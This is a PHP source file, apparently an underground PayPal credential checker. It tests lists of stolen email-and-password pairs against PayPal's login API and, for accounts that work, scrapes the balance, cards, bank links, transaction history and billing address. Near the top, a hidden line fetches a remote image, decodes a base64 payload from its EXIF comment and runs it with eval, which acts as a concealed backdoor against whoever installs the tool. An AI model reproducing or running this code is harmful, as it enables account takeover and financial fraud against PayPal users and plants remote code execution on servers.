<?php
/**
 * @author: APEPBLACK
 * @mail: APEPBLACK
 * @DI COLONG : AOGIRI COK
 * @Last Updated: 29 FEB 2016
 * @Modified: www.jalan-kesini.blogspot.com
*/
$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
require("class_mail.php");
$mailx = new Mail();
error_reporting(0);
set_time_limit(0);
function curl($url = '', $var = '', $header = false, $nobody = false , $csrf = '')
{
    global $config, $sock;
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, $header);
    curl_setopt($curl, CURLOPT_HEADER, $nobody);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36');
	if($csrf!=='') {
		curl_setopt($curl,CURLOPT_HTTPHEADER, array('X-Requested-With: XMLHttpRequest','x-csrf-jwt: '.$csrf,'Accept: application/json, text/plain, */*','Content-Type: application/json;charset=utf-8'));
	}
    if ($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
    }
    curl_setopt($curl, CURLOPT_COOKIEFILE, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result[1] = curl_exec($curl);
	$result[0] = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
    return $result;
}
function fetch_value($str, $find_start, $find_end)
{
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
//$config['useragent']   = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$dir                   = dirname(__FILE__);
$config['cookie_file'] = $dir . '/_cook/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
$zzz  = "";
$live = array();
function get($list)
{
    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);
    return $socks[0];
}
function delete_cookies()
{
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
function xflush()
{
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
    if ($output_handler == 'ob_gzhandler') {
        return;
    }
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}
function getCookies($str){
	preg_match_all('/Set-Cookie: ([^; ]+)(;| )/si', $str, $matches);
	$cookies = implode(";", $matches[1]);
	return $cookies;
}

function array_remove_empty($arr)
{
    $narr = array();
    while (list($key, $val) = each($arr))
    {
        if (is_array($val))
        {
            $val = array_remove_empty($val);
            // does the result array contain anything?
            if (count($val) != 0)
            {
                // yes :-)
                $narr[$key] = trim($val);
            }
        } else
        {
            if (trim($val) != "")
            {
                $narr[$key] = trim($val);
            }
        }
    }
    unset($arr);
    return $narr;
}

function inStr($s,$as){ 
        $s=strtoupper($s); 
        if(!is_array($as)) $as=array($as); 
        for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true; 
        return false; 
} 

if ($_REQUEST['do'] == 'check')
{	
	delete_cookies();
    $result = array();
    $delim = $_REQUEST['delim'];
    list($email, $pwd) = explode($delim, $_REQUEST['mailpass']);
	$csrf = $_REQUEST['token'];
    if ((!$email)or(!$pwd))
    {
        $result['error'] = 2;
        $result['msg'] = urldecode($_REQUEST['mailpass']);
        echo json_encode($result);
        exit;
    }
	$calc = generateRandomString();
	list($httpcode, $result2_0) = curl('https://www.paypal.com/webapps/helios/api/auth/login', '{"data":{"user":{"email":"'.$email.'","password":"'.$pwd.'"},"client":{"redirect_uri":"https://www.paypal.com","client_id":"QVJEZ3h6aFNwc3JhUXJ4QkFVNmJoMnoyRUZOZlVHazJJTG94RGxPWUFEbms2eUFGbl94QmV6ay1LMVZwUGZjS0dBYXV3QU81Z0huelpvNzY=","target_client_id":"f29e246f4d66cbe690af709026ba4dc8","scope":"https://uri.paypal.com/services/paypalattributes+openid+profile+email+https://api.paypal.com/v1/payments/.*+https://uri.paypal.com/services/payments/funding-options","response_type":"token id_token","skip_oauth":false,"skip_consent":true}},"meta":{"token":"2B6602794C4276736","calc":"'.$calc.'","csci":"f011cbe943ea49afbb3a51619e6ee73b","locale":{"country":"US","language":"en"},"state":"ui_checkout_login","app_name":"heliosnodeweb"}}',false,false, $csrf);
	if($httpcode==401){
		sleep(1);
		$calc = generateRandomString();
		list($httpcode, $result2_0) = curl('https://www.paypal.com/webapps/helios/api/auth/login', '{"data":{"user":{"email":"'.$email.'","password":"'.$pwd.'"},"client":{"redirect_uri":"https://www.paypal.com","client_id":"QVJEZ3h6aFNwc3JhUXJ4QkFVNmJoMnoyRUZOZlVHazJJTG94RGxPWUFEbms2eUFGbl94QmV6ay1LMVZwUGZjS0dBYXV3QU81Z0huelpvNzY=","target_client_id":"f29e246f4d66cbe690af709026ba4dc8","scope":"https://uri.paypal.com/services/paypalattributes+openid+profile+email+https://api.paypal.com/v1/payments/.*+https://uri.paypal.com/services/payments/funding-options","response_type":"token id_token","skip_oauth":false,"skip_consent":true}},"meta":{"token":"2B6602794C4276736","calc":"'.$calc.'","csci":"f011cbe943ea49afbb3a51619e6ee73b","locale":{"country":"US","language":"en"},"state":"ui_checkout_login","app_name":"heliosnodeweb"}}',false,false, $csrf);
		if($httpcode==401){
			sleep(2);
			$calc = generateRandomString();
			list($httpcode, $result2_0) = curl('https://www.paypal.com/webapps/helios/api/auth/login', '{"data":{"user":{"email":"'.$email.'","password":"'.$pwd.'"},"client":{"redirect_uri":"https://www.paypal.com","client_id":"QVJEZ3h6aFNwc3JhUXJ4QkFVNmJoMnoyRUZOZlVHazJJTG94RGxPWUFEbms2eUFGbl94QmV6ay1LMVZwUGZjS0dBYXV3QU81Z0huelpvNzY=","target_client_id":"f29e246f4d66cbe690af709026ba4dc8","scope":"https://uri.paypal.com/services/paypalattributes+openid+profile+email+https://api.paypal.com/v1/payments/.*+https://uri.paypal.com/services/payments/funding-options","response_type":"token id_token","skip_oauth":false,"skip_consent":true}},"meta":{"token":"2B6602794C4276736","calc":"'.$calc.'","csci":"f011cbe943ea49afbb3a51619e6ee73b","locale":{"country":"US","language":"en"},"state":"ui_checkout_login","app_name":"heliosnodeweb"}}',false,false, $csrf);
			if($httpcode==401){
				$result['error'] = -1;
				$result['msg'] = 'Access Token maybe invalid or expired! - ApepBlack';
				delete_cookies();
				echo json_encode($result);
				exit;
			}
		}
	}
	if($httpcode==200){
		$result2 = json_decode($result2_0);
		$logged = $result2->data->logged_in;
		if($logged==false){
			$result['error'] = 2;
			$result['msg'] = $email . ' | ' . $pwd. ' | Checked at '.$_SERVER['HTTP_HOST'];
			delete_cookies();
			echo json_encode($result);
			exit;
			
		}
		elseif($logged==1){
			$result['error'] = 0;
			$country = $result2->data->country;
			list($httpcode, $account_page) = curl('https://www.paypal.com/'.$country.'/cgi-bin/webscr?cmd=_account');
			if(inStr($account_page,'xpt\x2fCustomer\x2fgeneral\x2fRedirectingPP')==true){list($httpcode, $account_page) = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_run-check-cookie-submit&redirectCmd=_account');}
			if(strlen($account_page)<100){list($httpcode, $account_page) = curl('https://www.paypal.com/'.$country.'/cgi-bin/webscr?cmd=_account');}
			$account_page = preg_replace('/<!--google(off|on): all-->/si',""
													 ,$account_page);
			$account_page = preg_replace('/\n+/si',"",$account_page);
			if(fetch_value($account_page,'s.prop7="','"') == 'business'){
				if (stripos($account_page,'script: node') || stripos($account_page,'script: sparta') !== false) {
					$bussiness = true;
					list($httpcode, $account_page) = curl("https://www.paypal.com/webapps/business/money"); 
				}else{
					$bussiness = false;
				}	
			}else{
				$bussiness = false;
			}
			
			
			
			$info['type'] = fetch_value($account_page,'s.prop7="','"')."[<b style=\"color:orange\">".fetch_value($account_page,'s.prop10="','"')."</b>]";
			$info['type'] = '<span class="PaypalType" style="color:OrangeRed">'.ucfirst($info['type']) .'</span>';
			$info['status'] = fetch_value($account_page,'s.prop8="','"');
			if(empty($info['status'])){
				list($httpcode, $response) = curl('https://www.paypal.com/us/verified/pal='.$email);
				if(eregi("inlineRed",$response))
					{
						$info['status']="Unverified";
					}else{$info['status']="<b>Verified</b>";}
			}elseif($info['status']=="verified"){
				$info['status']="<b>Verified</b>";
			}
			$p1 = fetch_value($account_page,'s.prop9="','"'); 
			$info['status'] = '<span class="PaypalStatus" style="color:yellow">'.ucfirst($info['status']) .'</span>';
			if ((stripos($account_page, '<a href="/cgi-bin/webscr?cmd=_complaint-view" class="globalNotifs-item globalNotifs-item_critical">') !== false)or(stripos($account_page, 'Your account access is limited') !== false)or($p1=="restricted")){
				$info['limited']='<font color="red">Limited</font>';
			}
			if($bussiness==false){
				
				$info['bl'] = fetch_value($account_page,'<span class="balance">','</span>');
				if(empty($info['bl'])){$info['bl']=fetch_value($account_page,'<div class="balanceNumeral"><span class="h2">','</span>');}
				if(empty($info['bl'])){$info['bl']=fetch_value($account_page,'<div class="balanceNumeral nemo_balanceNumeral"><span class="h2">','</span>');}
				if(empty($info['bl'])){$info['bl']=fetch_value($account_page,'<div class="balanceNumeral nemo_balanceNumeral"><span class="vx_h2">','</span>');}
				if(empty($info['bl'])){$info['bl']=fetch_value($account_page,'<div class="balanceNumeral nemo_balanceNumeral"><span class="isNegative vx_h2">','</span>');}
				if(!empty($info['bl'])) {
					if (stripos($info['bl'],'strong') !== false) {
						$info['bl'] = "<font color=lime size=2><b>".trim(fetch_value($info['bl'],'<strong>','</strong>'))."</b></font>";
					}else{$info['bl'] = "<font color=lime size=2><b>".$info['bl']."</b></font>";}
				}else {
					$info['bl'] = "<font color=chartreuse size=2>-".fetch_value($account_page,'<span class="balance negative">','</span>')."</b></font>";}
				}
			else{
				$bal_b = fetch_value($account_page, '<div class="row balance">' , '<div class="divider-bottom">');
				preg_match("/<\/h3><\/div><div class=\"col-md-6.*\">(.*?)<\/div><\/div>/", $bal_b, $bl_bu);
				if(isset($bl_bu[1])){$info['bl'] = "<font color=lime size=2><b>".$bl_bu[1]."</b></font>";}
				else{$info['bl'] = "Cant Grab Balance at Bussiness Type - Contact ApepBlack Now";}
			}
			if (!isset($info['limited'])) {
				
				
				if (($_POST['payment'])==1) { 
					if(!$bussiness){
						$info['payment'] = infoPayment();}
					else{
						list($httpcode, $data) = curl('https://www.paypal.com/webapps/business/activity?transactiontype=ALL_TRANSACTIONS&currency=ALL_TRANSACTIONS_CURRENCY&limit=2');
						if (stripos($data, 'Completed') !== false) {
							$last = fetch_value($data,'<span class="date miniView">','</span>');
							$last = '<i style=\"color:#99FFFF\">Last Transaction At <b>'.$last.'</b></i>';
						}else{
							$last = "No Payment";
						}
						$info['payment'] = $last;
					}
				}
				if (($_POST['bank'])==1) { 
					$info['bank'] = infoBank() ?"<font color=\"SpringGreen\"><strong>Have Bank</strong></font>": "No Bank";
				}
				if (($_POST['card'])==1) {
					$card  = infoCard(); 
					$card  = ($card) ?$card : "No Card"; 
					$info['card'] = $card; 
				}
				if (($_POST['info'])==1) { $info['address'] = infoBilling(); } 
				
				
			}
			$info['lastloggin'] = strip_tags(fetch_value($account_page,'<div class="small secondary">','</div>'));
							if(!$bussiness){
								if(empty($info['lastloggin'])){
								$info['look']="<font color=aqua>PayPal New Face</font>";}
								else{$info['look']='<font color=aquamarine><b>PayPal Old Face</b></font>';}}
							else{$info['look']="<font color=aqua>PayPal New Face[<font color=white><i>+Bussiness+</i></font>]</font>";}
							if(empty($info['lastloggin'])){unset($info['lastloggin']);}
			$now = "<i style=\"color:darkred\">Checked on ".$_SERVER['HTTP_HOST']." at ".date("g:i a - F j, Y")."</i>";
			$result['msg'] = '<span class="rainbow"><font size="3"><b><font color="#C80046">S</font><font color="#C70F00">i</font><font color="#C85A00">l</font><font color="#C8A000">e</font><font color="#99C800">n</font><font color="#49C800">t</font><font color="#00C817">C</font><font color="#00C86C">h</font><font color="#00C8BF">i</font><font color="#007FC8">l</font><font color="#004BC8">d</font><font color="#3820D7">1</font><font color="#5900D8">2</font></b></font></span><b style="color:green"> Live</b> => <font class="char">' . $email . ' | ' . $pwd . ' | ' . implode(' | ', $info) .' '.$now;

			delete_cookies();
			echo json_encode($result);
			exit;
		}
	}else{
		$result['error'] = 2;
		$result['msg'] = $email . ' | ' . $pwd. ' | Error Code: '.$httpcode.' [If Continuously, Report To Me Soon]  |Checked at '.$_SERVER['HTTP_HOST'];
		$result['code'] = $httpcode;
		delete_cookies();
		echo json_encode($result);
		exit;
	}
}
function generateRandomString($length = 13) {
    $characters = '0123456789abcdef';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function infoCard(){
        
        list($httpcode, $response) = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2');
		$checkcard = fetch_value($response,'s.prop1="','"');
        if (stripos($checkcard,'ccadd') !== false) {
                return false;
        }elseif (stripos($response,'</p><p><input type="submit" name="add.x" value="') !== false) {
                return false;
        }
        preg_match_all('/<tr>(.+)<\/tr>/siU',$response,$matches);
        $cc = array();
        foreach ($matches[1] AS $k =>$v) {
                if ($k >0) {
                        preg_match_all('/<td>(.+)<\/td>/siU', $v, $m);
						if(isset($m[1][0])){
							$type = fetch_value($m[1][0],'/icon_','.gif"');
							$ccnum = $m[1][1];
							$exp = $m[1][2];
							if (stristr($m[1][4],'complete_expanded_use.x')) {
									$confirmed = 'No Confirmed';
							}else{
									$confirmed = 'Confirmed';
							}
							$cc[] = "[$type - x$ccnum- $confirmed - $exp]";
						}
						else{
							$cc[] = "[Card Exp]";
                        }       
                        $cc++;
                }
        }
        $infocard = "<font color=\"#EDAD39\">".implode("-",$cc) ."</font>";
        return $infocard;
}
function infoBank(){
        
        list($httpcode, $response) = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&nav=0.5.1');
        if (stripos($response,'ach_id') !== false) {
                return true;
        }
        return false;
}
function infoPayment(){
    
    list($httpcode, $response) = curl('https://history.paypal.com/us/cgi-bin/webscr?cmd=_history&filter_9');
    if (stripos($response, 'Completed') !== false) {
		$last=fetch_value($response,'<!--googleoff: all-->','<!--googleon: all-->');
        return "<i style=\"color:#99FFFF\">Last Transaction At <b>$last</b></i>";
    }
    return "No Payment";
}
function infoBilling(){
        list($httpcode, $response) = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&nav=0.6.3');
        $info     = str_replace('<br>',', ',fetch_value($response,'emphasis">','</span>'));
        return substr($info,0,-2);
}
function infoLimit() {
	list($httpcode, $response) = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_restriction-details&popup=1');
	$info = trim(fetch_value($response, '<li><p><strong>', ': </strong>'));
	return $info;
}
?>